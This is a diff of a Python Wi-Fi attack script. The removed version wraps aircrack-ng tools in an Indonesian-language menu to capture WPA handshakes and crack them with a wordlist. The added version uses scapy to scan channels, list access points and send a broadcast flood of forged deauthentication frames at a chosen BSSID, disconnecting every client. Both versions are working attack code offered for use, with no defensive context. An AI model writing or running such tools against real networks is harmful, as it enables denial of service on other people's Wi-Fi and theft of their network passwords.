@@ -1,46 +1,57 @@
 import subprocess
+from scapy.all import Dot11, RadioTap, sniff, sendp, Dot11Deauth
 
-def scan_networks(interface):
-    subprocess.run(["sudo", "airmon-ng", "start", interface])
-    subprocess.run(["sudo", "airodump-ng", "mon0"])
+# Wi-Fi interface (e.g., "wlan0")
+wifi_interface = "wlan0"
 
-def capture_handshake(bssid, channel, output_file):
-    subprocess.run(["sudo", "airodump-ng", "--bssid", bssid, "--channel", channel, "--write", output_file, "mon0"])
+# Function to change Wi-Fi channel using iwconfig
+def change_channel(channel):
+    subprocess.run(["iwconfig", wifi_interface, "channel", str(channel)])
 
-def crack_handshake(cap_file, wordlist):
-    subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, cap_file])
+# Set to store unique SSIDs and BSSIDs of discovered networks
+found_networks = set()
 
-def display_menu():
-    print("Pilih opsi:")
-    print("1. Scan Networks")
-    print("2. Capture Handshake")
-    print("3. Crack Handshake")
-    print("4. Keluar")
+# Callback function to process captured packets
+def packet_callback(packet):
+    if packet.haslayer(Dot11) and packet.haslayer(RadioTap):
+        if packet.type == 0 and packet.subtype == 8:  # Beacon frame
+            try:
+                ssid = packet.info.decode('utf-8')
+            except UnicodeDecodeError:
+                ssid = "Non-UTF-8 SSID"
+            bssid = packet.addr3
+            found_networks.add((ssid, bssid))
 
-def main():
-    wifi_interface = input("Masukkan nama antarmuka Wi-Fi: ")
+# Function to send deauthentication packet to all devices associated with an AP
+def send_deauth(target_bssid, num_packets):
+    # Create a deauthentication frame
+    deauth_frame = (
+        RadioTap() /
+        Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) /
+        Dot11Deauth(reason=7)  # Reason 7 is a common value for deauthentication
+    )
 
-    while True:
-        display_menu()
+    # Send the deauthentication frame
+    sendp(deauth_frame, iface=wifi_interface, count=num_packets)
+    print(f"Sent {num_packets} packets")
 
-        choice = input("Pilihan Anda: ")
+# Iterate through channels 1 to 11
+for channel in range(1, 12):
+    print(f"Scanning on channel {channel}")
+    # Change Wi-Fi channel using iwconfig
+    change_channel(channel)
+    # Start sniffing on the specified channel using the iface argument
+    sniff(iface=wifi_interface, prn=packet_callback, store=0, count=10, timeout=5)
 
-        if choice == "1":
-            scan_networks(wifi_interface)
-        elif choice == "2":
-            target_bssid = input("Masukkan BSSID target: ")
-            target_channel = input("Masukkan saluran target: ")
-            handshake_output = input("Masukkan nama file output handshake (.cap): ")
-            capture_handshake(target_bssid, target_channel, handshake_output)
-        elif choice == "3":
-            handshake_output = input("Masukkan nama file handshake (.cap): ")
-            wordlist_file = input("Masukkan nama file wordlist: ")
-            crack_handshake(handshake_output, wordlist_file)
-        elif choice == "4":
-            break
-        else:
-            print("Pilihan tidak valid. Silakan coba lagi.")
+# Display the found Wi-Fi networks after scanning is complete
+print("\nFound Wi-Fi Networks:")
+for ssid, bssid in found_networks:
+    print(f"SSID: {ssid}, BSSID: {bssid}")
 
-if __name__ == "__main__":
-    main()
-    
+# Get user input for the target BSSID and number of packets
+target_bssid = input("\nEnter the BSSID of the AP to deauthenticate all devices: ")
+num_packets = int(input("Enter the number of deauthentication packets to send to each device: "))
+
+# Send deauthentication packets to all devices associated with the target AP
+print(f"\nSending {num_packets} deauthentication packets to all devices associated with the AP with BSSID {target_bssid}")
+send_deauth(target_bssid, num_packets)
